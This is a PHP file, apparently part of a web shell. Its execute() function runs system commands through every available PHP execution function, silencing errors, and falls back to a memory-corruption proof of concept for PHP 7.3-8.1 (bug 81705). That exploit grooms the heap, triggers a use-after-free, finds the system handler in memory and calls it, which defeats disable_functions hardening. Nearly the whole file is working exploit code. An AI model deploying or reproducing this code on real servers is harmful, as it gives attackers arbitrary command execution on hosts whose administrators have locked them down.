<?

// execute($cmd) (type => string):
//      Try any way to execute the given system command.
//      The command output is returned by the function.
//      
//      $cmd (string):
//          The command line string to run.
//
// EXAMPLE:
//      >>> execute("whoami")
//      "www-data"
//
// TODO: This function is probably highly optimizable.


# PHP 7.3-8.1 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=81705
#
# This exploit should work on all PHP 7.3-8.1 versions
# released as of 2022-01-07
#
# Author: https://github.com/mm0r1



class Helper
{
    public $a, $b, $c;
}

class Pwn
{
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd)
    {
        for ($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }

        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);

        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        self::log("abc @ 0x%x", $abc_addr);

        $this->free($abc_addr);
        $this->helper = new Helper;
        if (strlen($this->abc) < 0x1337) {
            self::log("uaf failed");
            return;
        }

        $this->helper->a = "leet";
        $this->helper->b = function ($x) {
        };
        $this->helper->c = 0xfeedface;

        $helper_handlers = $this->rel_read(0);
        self::log("helper handlers @ 0x%x", $helper_handlers);

        $closure_addr = $this->rel_read(0x20);
        self::log("real closure @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        self::log("closure class_entry @ 0x%x", $closure_ce);

        $basic_funcs = $this->get_basic_funcs($closure_ce);
        self::log("basic_functions @ 0x%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        self::log("zif_system @ 0x%x", $zif_system);

        $fake_closure_off = 0x70;
        for ($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        self::log("fake closure @ 0x%x", $fake_closure_addr);

        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);

        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }

    private function heap_leak()
    {
        $arr = [[], []];
        set_error_handler(function () use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }

    private function free($addr)
    {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));

        $arr = [[], []];
        set_error_handler(function () use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }

    private function rel_read($offset)
    {
        return self::str2ptr($this->abc, $offset);
    }

    private function rel_write($offset, $value, $n = 8)
    {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }

    private function read($addr, $n = 8)
    {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if ($n !== 8) {
            $value &= (1 << ($n << 3)) - 1;
        }
        return $value;
    }

    private function get_system($basic_funcs)
    {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if ($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while ($f_entry !== 0);
    }

    private function get_basic_funcs($addr)
    {
        while (true) {
            // In rare instances the standard module might lie after the addr we're starting
            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
            // In that case, changing the direction of the search should fix the crash.
            // $addr += 0x10;
            $addr -= 0x10;
            if ($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if ($module_name === 0x647261646e617473) {
                    self::log("standard module @ 0x%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function log($format, $val = "")
    {
        if (self::LOGGING) {
            printf("{$format}\n", $val);
        }
    }

    static function alloc($size)
    {
        return str_shuffle(str_repeat("A", $size));
    }

    static function str2ptr($str, $p = 0, $n = 8)
    {
        $address = 0;
        for ($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }
}


function execute($cmd)
{
    $res = '';

    if (@function_exists('exec'))
    {
        @exec($cmd, $res);
        $res = implode("\n", $res);
    }
    elseif (@function_exists('shell_exec'))
    {
        $res = @shell_exec($cmd);
    }
    elseif (@function_exists('system'))
    {
        @ob_start();
        @system($cmd);
        $res = @ob_get_contents();
        @ob_end_clean();
    }
    elseif (@function_exists('passthru'))
    {
        @ob_start();
        @passthru($cmd);
        $res = @ob_get_contents();
        @ob_end_clean();
    }
    elseif (@function_exists('popen') && @is_resource($f = @popen($cmd, 'r')))
    {
        if (@function_exists('fread') && @function_exists('feof'))
        {
            while (!@feof($f))
                $res .= @fread($f, 1024);
        }
        elseif (@function_exists('fgets') && @function_exists('feof'))
        {
            while (!@feof($f))
                $res .= @fgets($f, 1024);
        }
        @pclose($f);
    }
    elseif (@function_exists('proc_open') && @is_resource($f = @proc_open($cmd, array(1 => array("pipe", "w")), $pipes)))
    {
        if (@function_exists('fread') && @function_exists('feof'))
        {
            while (!@feof($pipes[1]))
                $res .= @fread($pipes[1], 1024);
        }
        elseif (@function_exists('fgets') && @function_exists('feof'))
        {
            while (!@feof($pipes[1]))
                $res .= @fgets($pipes[1],1024);
        }
        @proc_close($f);
    }
    elseif (@function_exists('pcntl_exec') && @function_exists('pcntl_fork'))
    {
        $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
        $pid = @pcntl_fork();
        if ($pid == -1)
            $res .= '[-] Could not children fork. Exit';
        elseif ($pid)
        {
            if (@pcntl_wifexited($status))
                $res .= '[+] Done! Command "' . $cmd . '" successfully executed.';
            else
                $res .= '[-] Error. Command incorrect.';
        }
        else
        {
            $cmd = array(" -e 'system(\"$cmd\")'");
            if (@pcntl_exec('/usr/bin/perl', $cmd))
                exit (0);
            if (@pcntl_exec('/usr/local/bin/perl', $cmd))
                exit (0);
            die ();
        }
    }
    else{
        @ob_start();
        $command = @new Pwn($cmd);
        $res = @ob_get_contents();
        @ob_end_clean();

    }
    if (!is_string($res) || empty($res))
        return ("");
    return ($res);
}

?>
